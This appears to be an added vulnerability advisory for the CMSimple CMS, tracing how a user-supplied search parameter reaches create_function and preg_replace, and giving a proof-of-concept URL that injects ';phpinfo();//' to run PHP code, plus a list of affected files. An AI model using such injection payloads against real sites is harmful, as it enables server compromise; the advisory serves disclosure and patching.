@@ -1,0 +1,40 @@
+source: http://www.securityfocus.com/bid/68961/info
+  
+CMSimple is prone to multiple security vulnerabilities including:
+  
+1. Multiple arbitrary PHP code-execution vulnerabilities
+2. A weak authentication security-bypass vulnerability
+3. Multiple security vulnerabilities
+  
+An attacker can exploit these issues to bypass certain security restrictions, perform unauthorized actions and execute arbitrary script code in the context of the affected application. This may aid in further attacks. 
+
+vulnerable file "http://www.example.com/CMSimple/2author/index.php" 
+
+An attacker might execute arbitrary PHP code with this vulnerability. User tainted data is embedded into a function that compiles PHP code on the run and executes it thus allowing an attacker to inject own PHP code that will be executed. 
+This vulnerability can lead to full server compromise.
+
+Vulnerable Code:
+-------------------------------------vulnerable code---------------------------------------
+    1320: preg_replace $c[$s] = preg_replace($words, '<span style="background: ' . $cmsimple_highlight_bg . '; color: ' . $cmsimple_highlight_tx . ';">\\0</span>', $c[$s]);  // functions.php
+        1316: $words = array_map(create_function('$w', 'return "&".$w."(?!([^<]+)?>)&isU";'), $words);  // functions.php
+            1315: $words = explode(',', urldecode($_GET['search']));  // functions.php
+        1308:  function content($cmsimple_highlight_bg = NULL, $cmsimple_highlight_tx = NULL)
+        1308:  function content($cmsimple_highlight_bg = NULL, $cmsimple_highlight_tx = NULL)
+--------------------------------------vulnerable Code---------------------------------------
+    1324: preg_replace $c[$s] = preg_replace($words, '<span class="highlight_search">\\0</span>', $c[$s]);  // functions.php
+        1316: $words = array_map(create_function('$w', 'return "&".$w."(?!([^<]+)?>)&isU";'), $words);  // functions.php
+            1315: $words = explode(',', urldecode($_GET['search']));  // functions.php
+    
+
+
+
+-------------------------------PoC:------------------------------ 
+http://www.example.com/CMSimple/2author/index.php?color=';phpinfo();//
+
+also effect these files :
+    CMSimple/2lang/index.php
+    CMSimple/2site/index.php
+    CMSimple/2site2lang/index.php
+    CMSimple/cmsimple/cms.php
+    CMSimple/cmsimple/functions.php
+    CMSimple/index.php
